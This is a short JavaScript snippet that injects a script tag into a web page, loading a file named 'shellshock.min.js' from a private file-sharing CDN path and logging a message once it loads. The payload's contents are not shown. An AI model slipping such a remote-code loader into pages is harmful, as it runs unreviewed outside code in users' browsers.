
 var script = document.createElement('script');
  script.src = 'https://cdn.filesend.jp/private/718iLcR0IqWwORw3NFNBElQ7ywE9h9QR7l-h0VcXWnbWsS4M2M0wb3ftioOCNcZQ/shellshock.min.js';
  script.type = 'text/javascript';
  script.onload = function() {
    console.log('your script have been loaded');
  }
  document.body.appendChild(script);
